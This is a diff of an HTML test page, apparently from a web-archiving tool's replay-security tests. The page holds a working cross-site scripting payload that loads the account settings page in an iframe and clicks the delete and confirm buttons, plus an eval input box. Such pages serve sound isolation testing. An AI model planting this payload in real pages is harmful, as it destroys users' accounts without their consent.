@@ -1,29 +1,33 @@
 <html>
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-  <script>
-    $(function(){
-      // get settings page URL
-      var settingsUrl = wbinfo.top_url.split('/').slice(0,4).join('/')+'/_settings';
-
-      // add an iframe to the top level and navigate to settings
-      $('body', window.__WB_top_frame.document).append('<iframe id="deleteFrame" src="'+settingsUrl+'"></iframe>');
-
-      // run inside iframe once a second, as a simple way to run once iframe is loaded
-      setInterval(function(){
-
-        // get jquery reference to iframe contents
-        var $iframe = $('#deleteFrame', window.__WB_top_frame.document).contents();
-
-        // click delete button and confirm
-        $iframe.find('button[data-target="#confirm-delete-modal"]').click();
-        $iframe.find('#confirm-delete').click();
-
-      }, 1000);
-    });
-  </script>
 </head>
 <body>
   <p>When archived or played back, the script tag in this page should use cross-site scripting (XSS) to delete the current user account.</p>
+  <script>
+    // get settings page URL
+    var settingsUrl = wbinfo.top_url.split('/').slice(0,4).join('/')+'/_settings';
+
+    // add an iframe and navigate to settings
+    var iframe = document.createElement('iframe');
+    iframe.src = settingsUrl;
+    document.body.appendChild(iframe);
+
+    // keep retrying once a second until iframe is loaded
+    var interval = setInterval(function() {
+
+      // get reference to iframe document
+      var iframeDoc = iframe.contentWindow.document;
+
+      // click delete button and confirm
+      iframeDoc.querySelectorAll('button[data-target="#confirm-delete-modal"]')[0].click();
+      iframeDoc.querySelectorAll('#confirm-delete')[0].click();
+
+      clearInterval(interval);
+    }, 1000);
+  </script>
+  <form>
+    <textarea id="run_js"></textarea>
+    <input type="button" onclick="console.log(eval(document.getElementById('run_js').value))" value="eval">
+  </form>
 </body>
 </html>
